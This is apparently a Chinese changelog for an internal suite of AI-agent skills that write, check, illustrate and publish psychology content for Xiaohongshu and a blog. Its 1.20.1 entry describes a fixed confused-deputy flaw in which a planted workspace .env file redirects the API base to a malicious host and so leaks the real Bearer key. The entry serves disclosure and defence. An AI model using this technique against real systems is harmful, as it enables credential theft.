- **危机声明豁免链路穷尽同步**：`nbdpsy-xiaohongshu-creator/SKILL.md`（咨询师章节新增"三点差异"块 + 红线速记第 4 条注明"科普笔记适用/推介除外" + 关键文件表 `--no-crisis`）、`xiaohongshu-spec.md`（"危机声明惯例·每篇在位"与"F·危机声明排版位"均注明推介除外）、`nbdpsy-content-reviewer/references/checklist-note.md`（危机声明判据 4 注明推介笔记不判此条、其余判据照审）逐处补豁免注记。
- **G 系硬闸适用性**：counselor-note-spec §3 梳理一句——禁导流(G7)/极限词/医疗词/不编造(G4 精神)仍适用；**G1 最低出口律、G6 危机与 CTA 分离对推介场景不适用**（推介无危机声明可分离，结尾收藏/评论互动是自然选项非 G1 强求）。
- **测试**：`test_check_compliance.py` 加 2 例（`--no-crisis` 跳过危机声明但违禁词仍一票否决 / 干净推介文豁免通过而不带开关仍因缺声明 fail）；`test_count_xhs.py` 加 1 例（`--body-min/--body-max` 覆盖默认区间）。

未改 `count_xhs.py`/`check_compliance.py` 的既有默认行为（不传新参即旧口径），科普笔记闸不受影响。

### 生成产物统一「上图床拿 mcp 直链」交付运营（图文成图）+ 视频直链协同请求

**动机**：成图/成片做完后，运营要审看只能翻本地目录或找服务器路径，跨设备、发同事确认都不便；
图床（`publish_note.py --upload-images`，7 天免鉴权直链）本已就绪，把它接进交付收尾即可让运营「点开即看」。

- **`nbdpsy-xiaohongshu-creator/SKILL.md`**：第 6 步出图三条路线（路线 0 后端出图 / 有图像能力宿主 /
  无图像能力宿主）在图审 PASS 后**统一加收尾步**——每篇成图 `--upload-images {note_dir}/images/post-NN/`
  上图床（一篇一批，`urls` 按文件名页序对应 P01…PNN），把链接列表发运营「点开即看、7 天有效、过期重传」。
  明确两点：① 发布环节照旧读本地文件、不依赖图床链接；② 路线 0 的 `/uploads/opimg_*` 直链保存期不明
  （台账仅 2h），要交付查看统一转存图床。第 7 步路线 A 确认账号时/路线 B 人工交付时都把查看链接一并给运营。
- **`nbdpsy-xiaohongshu-creator/references/counselor-note-spec.md`**：§5「本人认可（硬闸）」补实操通道——
  简历卡成图 `--upload-images` 上图床后把链接发运营转咨询师本人过目（点开即看、无需传文件）；
  ⚠️ 注明**授权照片原图的图床链接只作 anchor_url 生图用、绝不当查看链接转发扩散**（真人肖像隐私红线），
  转给本人过目的只能是已重绘/合成的成图链接。
- **`nbdpsy-text-to-video/SKILL.md`**：交付章节补现状说明——成片暂以本地 MP4 交付（视频无图床上传端点），
  「视频产物公网直链」能力已向 nbdpsy-server 提协同需求，落地后改为链接交付；不改任何流程逻辑。
- **`nbdpsy-guide/SKILL.md`**：速查表加一行「运营说『把图发我看看 / 链接呢』→ 成图已上图床，直接把 mcp
  直链给 TA（7 天有效、过期重传），别甩本地目录/服务器路径」。
- **协同请求文档**（落在 NBDpsy 仓 `文档/2026-07-24-视频产物上传直链-协同请求.md`，仅此一份仓外产物）：
  请 nbdpsy-server 侧排期补 `POST /api/uploads/videos`（multipart 单文件 mp4，建议 ≥200MB/7 天，
  免鉴权 HMAC 直链目录同图床范式，复用 `/uploads/video/` 已有静态下发机制）。

纯文档接线，未改任何 `scripts/*.py` 代码（`--upload-images` 早已存在）；`pytest tests/` 仍 353 全绿。

---

## [1.31.1] — 2026-07-24

### pillar-spec R5 补注：正文 FAQ 节由前端展示层剥离

- 官网详情页曾双重渲染 FAQ（正文节 + FaqBlock），已在 marketing-web 渲染层修复
  （stripFaqSection，数据层不动）。R5 补注：正文仍必须写全 FAQ 节——下游拆小红书取材与
  preflight 校验都依赖它，别因页面上不直接显示就省略。

---

## [1.31.0] — 2026-07-24

### xiaohongshu-creator 落地「发布文案排版体系」（手机端实际渲染）

**动机**：小红书正文**不渲染 Markdown**（`publish_note.py` 发布前剥 `**/*/` 强调符），排版只能靠
换行/空行/emoji/全角符号；此前口吻规范只有一句「每段 2–4 行、配 1 个克制 emoji」太粗，写手容易
把加粗当强调（发布后被剥＝没排版）、或堆 emoji/花哨符号显成营销号——与治愈系心理科普调性冲突。
本次把这句粗规则展开成可执行的排版口径。

- **`references/xiaohongshu-spec.md` 新增 §1.6「发布排版规范（手机端实际渲染）」**：立治愈系"克制 > 热闹"
  总基调，六条细则——A 首行钩子排版（≤1.5 行、场景前置、句中断行）／B 分段与空行节奏（手机每行约
  20 字折行意识、每段 2–3 行、**强调靠金句独立成行不靠加粗**）／C emoji 三用法（序号·bullet／段末情绪／
  首行钩子）+ 心理类密度区间（全文 3–6 个、只选 🤍🌱🫂 温和款、禁 🔥💥❗）／D 分隔与装饰符白名单
  （禁花哨分隔线/装饰 bullet/彩色符号墙、破折号做解释改换行或括号）／E 结尾互动+标签行排版／F 危机
  声明排版位置（G6 单独成段、不点缀 emoji）；附 ⛔ 反面清单与 before/after「裸排 vs 优化排版」对照示例。
- **`SKILL.md` 第 2 步挂接**：写文案要求新增"写完必须按 §1.6 重排再落盘"；验证清单加「排版已按 §1.6 重排」项。
- **`assets/example-xhs-note.md` 黄金范例「## 发布文案」块按 §1.6 重排**：首行句中断行、金句独立成行、
  破折号全部改换行/逗号、强调不再靠加粗。**内容语义不变、汉字数不变**（`count_xhs.py` body_chars 恒
  447，emoji/符号不计数），`count_xhs.py` 与 `check_compliance.py` 仍全绿。
- **`references/counselor-note-spec.md` §3 文案骨架**：一句话挂接引用同一 §1.6 排版规范（不复制规则）。
- **`nbdpsy-content-reviewer/references/checklist-note.md`**：新增判据 9「发布文案排版按 §1.6 规范」——
  无排版/整坨文字墙=FAIL、emoji 超密度/营销号式花哨=FAIL、强调错位（靠加粗）=FAIL、危机声明/标签排版
  =FAIL；边界说明排版不数汉字、不拿配图的赭红/粗黑当 FAIL 理由。

---

## [1.30.0] — 2026-07-24

### seo-artical-creator 新增发布前统一预检管道 `preflight.py`

**动机**：pillar-spec 十条硬性要求此前分散在多个脚本与人工自觉之间，2026-07 真实事故=R3
「带出处统计块」被静默跳过发布（有文章引 8 篇实证研究却零数据点）。系统性解法=把**全部可机检项
进一条管道**，任一 fail 拦住发布；不可机检项明确标 manual 逐条自查，绝不做假阳性闸门。

- **新脚本 `scripts/preflight.py`**：一条命令逐项机检 R1 字数 / R2 答案前置 / R3 带出处统计块 /
  R5 FAQ / R6 参考文献 / R7 敏感词两级 / R8 危机声明 / R9 内链 / R10 结构 + frontmatter 完备
  F1（title/slug/excerpt/meta_description/category/tags/target_keywords/author）/ F2 标签对齐 +
  中文加粗与文内引用渲染合规。stdout 纯 JSON `{ok,summary,checks:[{id,rule,status,detail,fix?}]}`，
  status ∈ pass|fail|warn|manual，任一 fail → exit 1。`--online` 抽测 R6 参考文献 URL 可达性与
  R9 内链 /blog/ 目标 slug 存在性（网络失败宽容降级 warn）。内部复用 count_hanzi / lint_markdown /
  publish_post.parse_frontmatter，不 subprocess 套娃；引文可达性/数字口径/专家引语真实性列为
  manual，绝不假装能测。
- **`lint_markdown.py` 统计判据扩展**：RE_STAT 增加学术统计形态——相关/效应量（r/d/β/η²）、
  比值（OR/HR/RR/g）、置信区间（95% CI）；样本量（N=224）单独不算。修复「恋爱脑」一文正文含
  r=.42/r=−.29 等学术统计却被 R3 漏计的盲点。同步更新既有测试并补充学术形态/样本量用例。
- **SKILL.md 管道化改造**：第 4 步统一改跑 preflight，**全绿（无 fail）才允许发布**；第 5 步加硬性
  前置「preflight 未全绿禁止调用 publish_post.py」；原单脚本保留为局部调试；关键文件表补 preflight.py。
- **`references/pillar-spec.md`** R3 行补一句：统计形态含百分比/倍数/相关与效应量（r/d/OR 等）。
- **测试 `tests/test_preflight.py`**：最小合格文档全绿 + 逐项违规（每条 R 规则、frontmatter 六分类/
  meta 长度/tags 数量、敏感词两级分开测、F2 warn 不拦发布）。

---

## [1.29.2] — 2026-07-24

### 咨询师简历卡：AI 直出转正 + 高密度硬要求（运营定案）

- 实测 gpt-image-2 吃照片 anchor 的人物还原度与版式融合俱佳，**AI 直出改为默认路线**：照片
  `--upload-images` 上图床取直链 → `gen_images --pages <简历页> --anchor-url <直链>` 直出；
  **成图必须经咨询师本人过目认可后才可发布**（并入其自审环节，硬闸）；compose_photo 本地合成
  降级为像素级保真备选。
- **简历卡密度硬要求**：8–10 信息点、2–3 区块满版、图文双通道（教育/资质/受训/执业数据/擅长
  方向药丸组/风格句，全部取材 profile_sections）——「名片式」几条内容视为不合格；提示词骨架
  重写为金标准颗粒度，一张装不下拆两张同 anchor。

---

## [1.29.1] — 2026-07-24

### 咨询师推介：价格默认不展示（运营口径定案）

- 简历图与介绍文案默认均不含价格（大部分推介不露价、先建立信任），**生成前必须问运营
  「这篇要不要展示价格」**，明确要求才加；要加只能用两个公开字段实时值。spec 五处 + SKILL
  红线速记同步。

---

## [1.29.0] — 2026-07-24

### xiaohongshu-creator 新增「咨询师推介笔记」场景（不从长文拆分）

给某一位咨询师做一条图文推介笔记，取材于官网免鉴权公开 API，卖点是「这个人可信、可托付」。
新增 `references/counselor-note-spec.md`（字段口径 / 照片三铁律 / 文案骨架 / 4–6 页轮播 / P2 底图留白模板）、
两个脚本、SKILL 新章节与触发词、guide 速查表一行，测试 +7（288→295）。

- **脚本 `scripts/fetch_counselor.py`**：`--list` 出全部咨询师概览、`--emp <emp_no>` 出单人详情
  （含 `profile_sections` 全文）。风格照抄同目录 `fetch_post.py`。
- **脚本 `scripts/compose_photo.py`**：把运营提供的真实照片**本地几何合成**（等比裁剪 + 圆角 +
  品牌色描边）进 P2 简历卡底图的留白区，不联网、不调模型。`env_check.py` 的 xhs profile 把 Pillow
  列为该场景**可选模块**（缺失只 warn 不阻塞就绪，`--install` 仍自动补装）。

**为什么设 `contracted_price` 红线**：咨询师详情响应里带一个 `contracted_price`（签约价）——这是
工作室与咨询师之间的**结算价、属用户隐私口径**，与对外标价是两码事。一旦误当"优惠价"写进笔记，
既泄露内部结算、又与官网标价冲突。故 `fetch_counselor.py` 在返回前**显式 `del contracted_price`**，
任何产物绝不出现；对外价格只用 `price_per_session`（¥N / 次）与 `communication_price`（预沟通 ¥N / 免费）。

**为什么设照片三铁律**：真人肖像的合规与失真风险远高于插画。①**授权先行**——出图前必须拿到"咨询师
本人同意用于小红书宣传"的确认，未确认停等不出图；②**只本地合成、绝不喂 AI**——照片只走 `compose_photo.py`
做几何处理，绝不喂 Gemini/GPT 生图重绘（AI 改脸致肖像失真 + 伪造肖像合规风险）；③**不入库、用完即弃**——
照片不提交 git，交付后提醒运营自行保管。一张未授权或被改脸的咨询师照片流出，对靠信任吃饭的工作室是
可上门维权的事故，故宁可退回纯插画简历卡，也不碰这三条。

---

## [1.28.1] — 2026-07-24

### 修复 pillar-spec 表格排版

- v1.27.0/v1.27.1 把「固定分类清单」「标签选型三规则」误插进 API 字段映射表格中间，
  表格被拦腰截断；现移到表格之后，内容不变。

---

## [1.28.0] — 2026-07-24

### lint 新增 stat-block 规则：把 R3「带出处统计块」变成机器闸

- SEO/GEO 巡检发现近期文章（恋爱脑一文）引 8 篇实证研究却零统计数据点——硬性要求 R3
  （≥3 处统计+紧跟来源）一直存在但无机器校验，靠人工遵守失守。
- lint_markdown.py 新增 `--stats-min N`（默认 0 向后兼容）：统计样式（数字+%/‰/倍）须与
  `[[n]](url)` 引用标注**同行**才计数，不足 N 报 stat-block 违规；SKILL 流程命令改为
  `--citations <N> --stats-min 3`。测试 +3（含真实事故形态用例），288 全绿。

---

## [1.27.1] — 2026-07-24

### pillar-spec 补标签选型三规则

- v1.27.0 只给 tags 加了数量说明，本版补全体系：①**优先复用已有标签**（写前先拉
  /api/public/blog/tags 现有库，同义必须用原词——自由词自动入库，同义分裂会废掉标签聚合与
  相关推荐）；②命名规范（2–6 字中文名词短语、不带 #、不与分类名重复）；③至少 1 个标签对齐
  本篇 target_keywords 核心长尾词（标签页=长尾词聚合着陆面）。

---

## [1.27.0] — 2026-07-24

### seo-artical-creator：博客分类体系六分类 + 选型指南

- **动机**：官网 45 篇长文全挂「心理科普」单一分类，筛选条形同虚设——根因是 pillar-spec 的
  frontmatter 示例写死 `category_slug: psych-101` 且无选型指南，所有文章照抄示例。
- 生产库已建 5 个新分类并按主题回填 45 篇（创伤与疗愈 11 / 情绪与自我 18 / 亲密与家庭 7 /
  职场心理 2 / 留学生心理 1 / 心理科普兜底 6）；发布链路（category_slug/tags 映射）本就齐全，零代码改动。
- pillar-spec 新增「固定分类清单」六选一与判据（两类都沾选更具体的；绝不自造 slug——服务端 400；
  扩分类须先生产库建好再用）；SKILL.md frontmatter 字段清单补 category_slug/tags 并强调选型。

---

## [1.26.0] — 2026-07-24

### 黄金范例升级 v1.9 知识海报密度体系（xiaohongshu-creator）

- **动机**：assets/example-xhs-note.md 是 SKILL 指定的「对照学习」锚点，但内容页提示词
  还是 v1.8 之前的老简版（每页 285–335 字，实测出图仅 3 条要点），落后于 v1.9 规格会把
  新拆笔记的密度往低里带。
- **升级**：P2–P5 按 layout-gallery 金标准颗粒度逐页重写（335→1800–2200 字/页），四页四种
  版式（⑭误区纠错卡/②对比表/⑦拆解结构图/⑥数据图），每页 ≥6 信息点、图文双通道、抽象落地
  具体场景；P1 封面/P6 末页保持柔和治愈精简定位；补齐缺失的「视频参考图提示词」节
  （**PN** 标记，不破坏页数计数契约）。事实基底零新增（数字/出处全部溯源 pillar 原文）。
- **对抗审查 2 medium + 5 low 全修**：比例锚点「竖版 3:4 构图（1080×1440）」统一归位行尾
  （防 1:1 切换正则截断锚点后的合规要求）、⑭ 结语条补模板必备的求助判据、P5 数据补
  Cloitre 2019 出处并厘清分母口径、P3 溯源修正与格内说明压回 ≤10 字、P6 副标题两处同源。
- **真图密度验证通过**：新版 P2 实测出图为完整误区纠错海报（10+ 信息点、6 个各不相同的
  具体场景、锚点人物一致），对比旧版 3 条要点简卡密度质变。285 测试全绿。

---

## [1.25.0] — 2026-07-23

### 路线 0 复活：后端一致性生图回归通过 + 删除四态对齐 + 插件 2.1.3 话术

- **一致性生图已在 nbdpsy-server 按原契约 1:1 复刻上线**，skill 侧端到端回归通过
  （P1 封面 + 锚点批量 2/2，urls 下标对齐/锚点一致性/中文零错字/502 瞬时容忍均实测）；
  撤掉 SKILL.md 路线 0 与 gen_images.py 的「暂不可用」标注，后端自动出图恢复为默认首选。
  对齐行为差异：台账 404=gone→「可安全重新发起」（生图与删除相反，重发只多扣额度）；
  单次 prompts>99 客户端硬拦；已知实际出图 1024×1536（2:3），风格闸门与提示词注明勿贴上下边缘。
- **删除任务四态对齐**（server 台账已落库）：新增接口 unknown（重启打断删除执行→人工创作中心
  核对）；404 语义改「deletion_id 不存在」；超时 hint 改 --delete-status 重查（台账落库随时可查）。
- **guide 插件话术**：extension_version（当前 2.1.3）↔ chrome://extensions 版本比对（别拿服务端
  version 字段比）；换新包步骤；「使用帮助」内置指南入口 FAQ。
- 两份交接文件反馈区均已回执（含 2:3 比例与引号渲染两条信息级反馈）。

---

## [1.24.1] — 2026-07-23

### guide 补视频 remake/revise 话术

- guide 3.5 节此前只讲基础搬运——补「再制作（remake）」与「修订成片（revise，可反复迭代）」
  两条运营话术与命令（含仅 remake 可修订、真人出镜勿用 remake、attribution 等边界），速查表加
  「这条视频 XX 处改一下」一行。youtube-transport skill 本体 v1.22.0 已支持，此为客服台入口补齐。

---

## [1.24.0] — 2026-07-23

### 删除已发布笔记（全新能力）+ 导出 no_data 语义 + 拉数据 --refresh

- **来源**：nbdpsy-server 交接《2026-07-23 server 更新——删除笔记与数据导出》。server 已上线两块
  运营能力（均真账号 e2e 验证、生产生效）：**按标题删除已发布笔记**（异步，`note-deletions` 两条端点）
  与**笔记数据导出的 no_data 明确语义**。契约以 `notes_rest.py` 的 `MANIFEST_ENTRIES` 为准逐参核对。
- **`publish_note.py` 新增 `--delete-note`**（按标题删已发布笔记，**不可逆**）：
  `--delete-note --account <号> --title "<标题>" [--count N]`。stderr 起手警示「删除不可逆，应已与运营
  确认」；POST `/api/accounts/{id}/note-deletions {title,count}`（客户端预检 count 1–10）→ 每 4s 轮询
  到终态（默认 300s）。`done` → `{outcome:done, deleted, remaining}`（remaining>0 带剩余篇数 hint）；
  `error` → 按 reason 给 hint（`note_not_found`=标题须精确匹配可先 --notes 核对；`need_manual_login`=
  登录态失效重扫码），exit 1。**poll 404（进程内存台账失效，server 重启即丢）或轮询超时 → `unknown`**：
  删除不可逆、可能已执行也可能没有，hint 引导「先 --notes --refresh 核对剩余篇数、确认仍需删除再重发，
  绝不盲目重发」，exit 0。
- **`--notes` 新增 `--refresh` 旗标**：先 POST `/api/accounts/{id}/note-exports` → 每 4s 轮询导出到终态
  （默认 300s）→ 成功后走现有 `account_notes` 读快照。导出 `error` 且 reason 含 `no_data`（当天刚发的
  笔记次日才入看板）→ `{available:false, no_data:true}` + 话术 hint，**exit 0（不是故障）**；其它 error
  原样落 failed。`--wait-timeout` 默认改为按用途取（发布 900 / 删除·导出 300）。
- **`account_notes` 404 兜底文案更新**：由「联系管理员核对」改为「先跑 --notes <账号> --refresh 触发
  一次导出再读」。
- **`nbdpsy-guide/SKILL.md`**：手册 ⑦ 之后插入「⑧ 删除已发布的笔记（不可逆）」——触发前必须复述
  「账号+完整标题+删几篇」得运营确认才执行；原「⑧ 图床」顺延为 ⑨，「八件事」→「九件事」，速查表/FAQ
  同步（删错不能恢复 / 发重了用 ⑧ 清理 count=多余篇数 / 今天刚发次日才有数据）；⑥ 拉数据节补 `--refresh`
  用法与 no_data 话术。
- **测试**：`tests/test_publish_note.py` 追加 13 例（delete POST 路径与 {title,count} payload、count 0/11
  预检、done 带 deleted/remaining、error 两 reason 的 hint 分支、poll 404→gone→unknown 安全 hint、超时
  running→unknown；refresh POST note-exports→轮询→no_data available:false exit 0、done 末尾调
  account_notes、其它 error 抛；404 新文案；`--delete-note` 缺 --title argparse 校验），全绿。

---

## [1.23.0] — 2026-07-23

### 发布线增强（改期 / 撤稿 / 列任务 / 图床 / whoami 自检）

- **背景**：nbdpsy-server 已上线一批发布线 REST 端点（`publish_rest.py` 的 PATCH/cancel/list、
  `uploads_rest.py` 图床、`system.py` whoami），`publish_note.py` 补齐对应子命令，让运营发出去之前
  还能改、发错了能撤、图片可先传图床。契约以服务端 manifest（`publish_rest.py`/`uploads_rest.py`/
  `system.py`）为唯一事实源逐条核对。
- **publish_note.py 新增子命令**（风格与既有 `--list-accounts`/`--job`/`--check-cookie` 一致，stdout 纯 JSON）：
  - `--list-jobs [--account 号] [--status 状态] [--limit N]`：列发布任务，输出精简字段
    `{job_id, account_id, title, status, schedule_time, note_url, error, created_at}`（与服务端
    `_job_view` 对齐取子集）；`status` 原样透传，非法值由服务端 400 回合法清单。
  - `--reschedule <id> --schedule <时刻|now>`：改待发定时，**PATCH 只带 `schedule_time`，绝不多带字段**
    （部分更新语义是服务端契约核心）；`now` → `{"schedule_time": null}` 清空转立即发；非 pending
    返回 `{ok:false,status}` → exit 1 + hint（已在发/已终态需另建新任务）。
  - `--cancel <id>`：撤稿；`{ok:true}` exit 0，`{ok:false,status}` exit 1 + 按 status 区分文案，404 透传。
  - `--upload-images <目录|文件...>`：图床上传（multipart 字段名统一 `files`），客户端预检 1–18 张，
    目录按文件名排序；输出 `{batch_id, urls, expires_at, warnings}`，urls 可直接作发布 images，7 天过期。
  - `--list-uploads`：列自己未过期的上传批次，透传 `{batches:[...]}`。
- **`--self-check` 说明对齐**：第一步先打 `GET /api/whoami`（最便宜的连通 + key 校验），身份
  `{name, role}` 并入输出——此前版本已如此实现，本次补测试固化该顺序契约。
- **测试**：`tests/test_publish_note.py` 追加 14 例（reschedule PATCH 方法/路径/payload 只含
  schedule_time/`now`→null/非 pending 语义、cancel 两分支、list-jobs query 组装与精简字段、
  upload-images multipart 字段名与顺序及 1–18 预检、目录收集排序、whoami 先行），全绿。

---

## [1.22.0] — 2026-07-23

### 薯营家停机迁移（视频线切 /api/video + remake/revise 新能力 + 生图缺口协同记录 + 死链清理 + 基址统一）

- **背景**：薯营家（`xhs.nbdpsy.com`）2026-07-23 整套永久停机（调用=连接失败非 410），一切能力统一到
  nbdpsy-server（`mcp.nbdpsy.com`），唯一凭据仍是同一把 `NBDPSY_XHS_API_KEY`（nbdpsy-server apikey）。
- **基址统一（shared/nbdpsy_common.py，同步 6 副本）**：`DEFAULT_VIDEO_API_BASE` 由 `xhs.nbdpsy.com`
  改为 `https://mcp.nbdpsy.com`（与 `xhs_api_base` 同服务同凭据）；`SANDBOX_ALLOW_DOMAINS` 移除
  `xhs.nbdpsy.com`。
- **视频线迁移+增强（nbdpsy-youtube-transport/scripts/transport_video.py）**：
  - 端点 `/api/video-transport/jobs*` → `/api/video/jobs*`（建/查/列/retry/delete 全部）；列表读 `items`。
  - 建任务新增 **`--mode transport|remake`**（默认 transport）；逐参核对 nbdpsy-server `video_rest.py`
    请求模型，`voice/burn_subtitles/max_resolution` 服务端仍收，故保留。
  - 产物键扩展 `storyboard_url`/`meta_url`（仅 remake，缺失容忍），相对 `/uploads/…` 拼 mcp 成免鉴权直链。
  - **新增成片修订 `--revise <job_id> --instructions "…"`** → `POST /api/video/jobs/{id}/revise` →
    派生子任务增量重制并默认轮询到终态（`--no-wait` 同语义）；400=解析失败带 LLM 说明、409(detail)=父片
    未完成/非 remake。
  - 轮询间隔对齐红线（30s）；`--mode remake` 与 `--revise` 默认 wait-timeout 提到 4500s，transport 维持 1800s。
  - 错误契约注释写明 409 用 `detail` 键；unknown 态绝不重发语义原样保留。
  - SKILL.md 补 remake/revise（含「仅平面图形类、真人勿用」「发布须附 meta attribution、重要成片人工终审」）、
    基址/凭据表述改 nbdpsy-server、附两条 mcp 标杆样片直链；tests 同步（路径、mode、revise、409 detail、items）。
- **生图缺口处置（不绕路）**：nbdpsy-server 36 端点无一致性生图（原薯营家 `POST /api/op/consistent-images`
  随停机消失）。`nbdpsy-xiaohongshu-creator/SKILL.md` 路线 0 开头 + `gen_images.py` docstring 顶部加现状
  说明（本路线暂不可用、走宿主/人工兜底、服务端补齐即恢复）；**代码逻辑与契约不动**，base 随 `video_api_base`
  指向 mcp。缺口与旧契约完整记录在 NBDpsy 仓 `文档/2026-07-23-一致性生图未迁移-协同记录.md`，请 server 侧排期。
- **死链清理**：README/setup.py/nbdpsy-guide/publish_note.py/gen_images.py 及 tests 中的 `xhs.nbdpsy.com`
  /`video-transport`/「运营接入 JWT」措辞逐处清理为 nbdpsy-server apikey；publish_note `--notes` 注释由
  「server 端上线中」改为已上线（笔记主键 (账号,标题,发布时间) 三元组、无 note_id）。
- 版本 1.21.0 → 1.22.0（plugin.json + marketplace.json 共 3 处）。

---

## [1.21.0] — 2026-07-21

### xiaohongshu-creator：篇数以用户为准（1–2 篇小批量模式）

- 此前验证闸门写死 5–8 篇，用户说「只拆 1 篇」时 agent 需临场取舍、行为不一致。
  现明确：**用户指定篇数时以用户为准**，小批量选型优先级——单篇选 P2 处境命名（主力路径），
  两篇选 P2 + P9 首访祛魅（击中场景＋降求助门槛，认知层+转化层最小闭环）；固定配比不适用，
  **其余护栏一律不降**（五问/慢性度/G1–G10/危机声明/合规扫描/P4·F1 零产出照常）。
  overview 须注明本次未覆盖的原文核心点，便于同一长文下次续拆不撞车。

---

## [1.20.1] — 2026-07-21

### 安全修复：基址解析不再信任 workspace/.env（confused deputy）

- **缺陷**：`xhs_api_base()` / `video_api_base()` 原走 `get_secret` 三层解析（环境变量 >
  workspace/.env > 用户级 secrets）。攻击者往内容工作区塞一个**只写 `NBDPSY_XHS_API_BASE=
  <恶意主机>`、不写 key** 的 `.env`：基址被 workspace 层改写、真密钥继续从用户级穿透解析，
  发布/搬运/生图请求会把真 Bearer 密钥发去恶意主机。
- **修复**：新增 `get_base()`——基址只认 环境变量 > 用户级 secrets > 默认值，**跳过
  workspace/.env**（与 publish_post.py / fetch_post.py 的既有正确写法对齐）；密钥解析三层
  行为不变。三个调用方（publish_note / transport_video / gen_images）经共享助手一处修复全覆盖。
  临时改基址请用环境变量或各脚本 `--api-base`。安全回归测试 +2。

### 即梦登录对齐 CLI 设备流现实（dreamina_login.py）

- 即梦 CLI 已弃用旧「本地回调自动弹浏览器」，现行默认即 OAuth 设备流。浏览器模式改为：
  从管道拿到完整登录链接后**脚本自己开浏览器**（主路径而非兜底），并顺手生成一张备用二维码
  PNG（默认浏览器不可用时手机直接扫）；进度文案同步改写，不再声称"CLI 已自动弹出浏览器"。

---

## [1.20.0] — 2026-07-21

### 小红书配图接后端一致性出图（gpt-image 锚点法）

- **动机**：轮播配图此前只有「宿主自己画 / 人工喂 Gemini-GPT」两条路，一套 5–8 篇 × 6–9 页 = 30–70 张，
  品牌基底一漂移（配色跑偏 / 人物换脸 / 出成方图）就整批全废重出——最贵的事故。后端上线 gpt-image
  **锚点法一致性出图**后，本级接上它，让「先出封面过闸门、确认后整号锚定同一张 P1 批量出」变成命令。
- **新脚本 nbdpsy-xiaohongshu-creator/scripts/gen_images.py**：经运营工具 op API 出图（复用
  `NBDPSY_XHS_API_KEY` 同一把运营接入 JWT，base 用 `NBDPSY_VIDEO_API_BASE`，默认 `https://xhs.nbdpsy.com`）。
  - **本地提取**每页提示词，判据与后端 `extract_slide_prompts` 完全一致（行首 `### P<数字>` 定位页 +
    页区间内第一个完整 ``` 围栏块）；**完整性校验**拦缺围栏页（后端会静默跳过导致页序错位）；
    `## 视频参考图提示词` 节的 `**P1**` 加粗标记天然不被计入。
  - **P1 锚点闸门**：`--cover-only` 只出封面 → 运营确认配色/人物/比例/图中中文 → 输出里的 `anchor_url`
    喂给**整套所有篇所有页**（`--anchor-url`），各页独立锚定生成，整个号调性统一。
  - 异步 job（202 拿 job_id + session_id）+ 轮询到终态（间隔 10s，默认超时 max(180, 页数×90)）+
    逐页下载到 `{note目录}/images/{note名}/P01.png…`；`--pages 2-9 / 3,5` 只重出失败页（带同一锚点）；
    `--job/--session` 复查补下（状态文件恢复页映射）；`--dry-run` 离线看 payload。
  - stdout 纯 JSON（done/partial/failed/pending/unknown）：额度/限流表现为 done+errors，透传到该页 `error`；
    `pending/unknown` 绝不重发（防重复生成烧额度）——与 publish_note / transport_video 同款不重发范式。
- **SKILL.md 第 6 步**改名「出图（后端一致性出图优先，宿主自适应兜底）」，新增**路线 0 · 后端一致性出图**
  （凭据在位默认首选，把风格闸门映射成三条命令）；原「有/没有图像生成能力」两分支降为凭据缺失时的兜底；
  风格确认闸门 blockquote 原样保留；关键文件表与铁律 3 同步。
- 单测 `tests/test_gen_images.py`（24 例，纯函数不打网）：提取器 / 完整性校验 / 视频参考图节不被提取 /
  页选择解析与越界 / 两位数命名 / 相对 URL 拼绝对 / 终态映射与 errors 透传 / dry-run CLI 契约。

---

## [1.19.1] — 2026-07-20

### nbdpsy-guide 补「更新工具包」指引

- 此前 7 个 skill 里无任何一处写更新命令，运营说「更新 nbdpsy-skills」时 agent 只能靠猜。
  nbdpsy-guide 新增「更新工具包」节：**命令由 agent 替运营跑**（Windows 借
  `powershell.exe -NoProfile -ExecutionPolicy Bypass` 跑 irm 一条命令；Linux/macOS 用 curl|bash），
  说明凭据不受覆盖影响（用户级 secrets.env / ~/.dreamina_cli/ 均在仓库外）、完成后提醒重启 Claude Code。
- description 触发词补「更新工具包 / 更新 nbdpsy-skills / 升级 skill / 装最新版」；常见问题速查表同步加行。

---

## [1.19.0] — 2026-07-20

### 即梦登录一键化（dreamina_login.py）

- **事故动机**：Windows 小白运营被旧文案引导跑 `dreamina login --headless`，终端字符二维码显示不出
  （headless 需 google-chrome + 终端字体），PowerShell 折行又把 verification_uri 里的 user_code 参数
  截断（浏览器报"没有 user_code"），每次重跑还生成新码作废旧网址——反复登录失败。而有屏机器根本
  不该用 `--headless`：`dreamina login` 默认模式本就会自动弹默认浏览器完成登录。
- **新脚本 scripts/dreamina_login.py**：登录全程 agent 包办，用户唯一动作是用**抖音 App 扫码/点确认**。
  - `--mode auto`（默认）自动判断：Windows/macOS 或有 DISPLAY/WAYLAND 的 Linux → 弹默认浏览器
    （`dreamina login`）；无屏 Linux 服务器 → `dreamina login --headless` 并把抖音二维码生成 PNG 图片
    交给 agent 展示给用户扫（缺 `qrcode` 库先自动 pip 装，装不上降级为只给完整网址）。
  - 浏览器模式下 CLI 若弹不开浏览器（设备流回退），脚本从管道拿到**完整逻辑行**的 verification_uri
    自己 `webbrowser.open()`——天然免疫终端折行截断（根治 Windows 事故）。
  - 成功判据 = 每 4s 轮询 `dreamina user_credit` 拿到 `total_credit`，不依赖子进程退出码；已登录则幂等直接返回。
  - 二维码几分钟过期 → `--timeout`（默认 240s）超时自动杀进程换新码，`--retries`（默认 3）次。
  - 所有子进程 `encoding=utf-8, errors=replace`（防 Windows GBK 崩），异常/退出路径 finally 杀子进程。
  - `--check-only` 只查登录态不发起登录；stdout=JSON / stderr=中文进度。
- **全仓话术统一**：check_env.py / SKILL.md / setup.py / README.md / jimeng_gen.py / seedance_jimeng.py /
  nbdpsy_common.py（含 6 份副本）里教用户手敲 `dreamina login --headless` 的引导，一律改为
  「让 AI 帮你登录（自动弹浏览器/出二维码，抖音 App 扫码即可）」；`--headless` 仅保留在脚本内部实现
  与「无屏服务器」说明语境。
- 测试 +8（test_dreamina_login.py：设备流行解析提完整 URL/user_code + 干扰行/缺项、auto 模式选择
  Windows/macOS/Linux±DISPLAY/Wayland 五场景），不跑网络/真 CLI。

---

## [1.18.0] — 2026-07-18

### 新增 skill：nbdpsy-youtube-transport（YouTube 视频搬运）

- **新技能**：给一条 YouTube 链接，产出带中文字幕/配音、可直接发布的成片 + 中英字幕 + 中英双语逐字稿。
  重活全在服务端（小红书运营工具后台 `https://xhs.nbdpsy.com`）：下载 → 转写 → qwen-mt 翻译 →
  豆包配音 → 音画同步 → 烧中文字幕 → 出成片，并自动打 NBDpsy 品牌 logo + 片头版权声明。
